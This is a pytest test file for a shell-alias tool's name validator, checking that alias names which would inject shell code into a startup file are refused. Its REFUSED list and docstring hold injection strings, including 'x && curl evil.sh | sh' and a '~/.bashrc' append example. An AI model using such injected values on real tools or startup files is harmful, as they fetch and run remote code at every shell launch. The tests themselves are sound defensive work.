from unittest.mock import Mock
import pytest
from thebleep.entrypoints.alias import _checked, _get_alias, \
    print_alias, print_alias_loader


@pytest.mark.parametrize(
    'enable_experimental_instant_mode, which, is_instant', [
        (True, True, True),
        (False, True, False),
        (True, False, False)])
def test_get_alias(monkeypatch, mocker,
                   enable_experimental_instant_mode,
                   which, is_instant):
    args = Mock(
        enable_experimental_instant_mode=enable_experimental_instant_mode,
        alias='bleep', )
    # `alias` imports `which` only when instant mode asks for it.
    mocker.patch('thebleep.utils.which', return_value=which)
    shell = Mock(app_alias=lambda _: 'app_alias',
                 instant_mode_alias=lambda _: 'instant_mode_alias')
    monkeypatch.setattr('thebleep.entrypoints.alias.shell', shell)

    alias = _get_alias(args)
    if is_instant:
        assert alias == 'instant_mode_alias'
    else:
        assert alias == 'app_alias'


def test_print_alias(mocker):
    settings_mock = mocker.patch('thebleep.entrypoints.alias.settings')
    _get_alias_mock = mocker.patch('thebleep.entrypoints.alias._get_alias')
    known_args = Mock()
    print_alias(known_args)
    settings_mock.init.assert_called_once_with(known_args)
    _get_alias_mock.assert_called_once_with(known_args)


ACCEPTED = ['bleep', 'fuck', 'oops', 'f', '_f', 'fix-it', 'BLEEP', 'b2',
            u'爆']
REFUSED = ['x; touch /tmp/PWNED; f', 'x && curl evil.sh | sh', '$(id)',
           '`id`', 'a b', "a'b", 'a"b', 'a|b', 'a&b', 'a>b', 'a\nb', '2fast',
           '-f', '', 'a=b', './f', 'a;b']


@pytest.mark.parametrize('name', ACCEPTED)
def test_a_name_is_accepted(name):
    assert _checked(name) == name


@pytest.mark.parametrize('name', REFUSED)
def test_shell_code_is_not_a_name(name, capsys):
    """The name is pasted into shell code that goes into a startup file.

    `thebleep --alias-loader 'x; curl evil.sh|sh; f' >> ~/.bashrc` used to write
    a line that ran that at every shell startup. Nothing goes to stdout, so the
    append adds nothing.

    """
    with pytest.raises(SystemExit) as exit:
        _checked(name)
    assert exit.value.code == 1
    out, err = capsys.readouterr()
    assert out == ''
    assert 'cannot be the name of the alias' in err


@pytest.mark.parametrize('argument', ['alias', 'alias_loader'])
def test_the_printers_check_the_name(argument, mocker, capsys):
    mocker.patch('thebleep.entrypoints.alias.settings')
    known_args = Mock(enable_experimental_instant_mode=False,
                      **{argument: 'x; touch /tmp/PWNED; f'})
    printer = print_alias if argument == 'alias' else print_alias_loader
    with pytest.raises(SystemExit):
        printer(known_args)
    assert capsys.readouterr()[0] == ''


def test_a_shell_keyword_is_left_to_the_shell():
    """`if` has the shape of a name, so it gets through here.

    Defining a function called `if` is something a shell refuses by itself,
    loudly and at the moment it happens, which is a better place for it than a
    list of every keyword of every shell we support.

    """
    for keyword in ('if', 'then', 'fi', 'while', 'function'):
        assert _checked(keyword) == keyword
